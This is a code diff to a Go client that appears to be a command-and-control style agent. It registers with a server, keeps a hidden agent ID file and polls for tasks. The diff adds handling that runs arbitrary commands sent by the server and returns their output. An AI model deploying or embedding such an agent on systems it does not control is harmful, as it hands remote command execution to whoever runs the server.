@@ -10,7 +10,7 @@ import (
 
 // TODO: client config file
 var server = "http://127.0.0.1:8443/api/end/"
-var pollingDelay = 3 * time.Second
+var pollingDelay = 5 * time.Second
 
 func main() {
 	log.Printf("The stones are capped.... Or whatever")
@@ -25,13 +25,13 @@ func main() {
 	var fp = filepath.Join(dirname, ".agent_id")
 
 	_, err = os.Stat(fp)
-	var id = ""
+	var agent_id = ""
 
 	if os.IsNotExist(err) {
 		// No agent ID file
 		log.Printf("We have not previously registered on the server.")
-		id = register(server)
-		SaveAgentID(fp, id)
+		agent_id = register(server)
+		SaveAgentID(fp, agent_id)
 		log.Printf("We are now registered on the server.")
 	} else {
 		log.Printf("We have already registered on the server.")
@@ -39,7 +39,7 @@ func main() {
 		if err != nil {
 			log.Fatal(err)
 		}
-		id = strings.TrimSpace(string(cont))
+		agent_id = strings.TrimSpace(string(cont))
 	}
 
 	time.Sleep(pollingDelay)
@@ -49,7 +49,7 @@ func main() {
 	for running {
 		log.Printf("Checking for tasks.....")
 
-		var res = checkin(server, id)
+		var res = checkin(server, agent_id)
 
 		if len(res) == 0 {
 			log.Printf("No tasks found for me.")
@@ -57,12 +57,32 @@ func main() {
 			log.Printf("Task found for me.")
 			for i, task := range res {
 				log.Printf("Task %d: %s", i+1, formatTask(task))
+
+				// Now we'd have to decode the JSON of the tasks to do
+				// Which should have an ID and command(s) to run
+				var instruction = taskValue(task, "instruction")
+
+				if instruction == "syscall" {
+					var cmd = taskValue(task, "arg")
+					log.Printf("Running " + cmd + " for task ID " + taskValue(task, "task_id"))
+
+					var cmdout = GetCommandOutput(strings.Split(cmd, " "))
+
+					result := cloneTask(task)
+					updateTaskValue(result, "stdout", cmdout)
+					updateTaskValue(result, "stderr", "")
+					updateTaskValue(result, "exit_code", 0)
+					updateTaskValue(result, "stopped_processing_at", time.Now().Format(time.RFC3339))
+					updateTaskValue(result, "responded", true)
+
+					_ = submitTaskResult(server, agent_id, result)
+					log.Printf("Submitting task result for task ID " + taskValue(task, "task_id"))
+
+				}
+
+				// Then we would post it back
+
 			}
-
-			// Now we'd have to decode the JSON of the tasks to do
-			// Which should have an ID and command(s) to run
-
-			// Then we would post it back
 
 		}
 
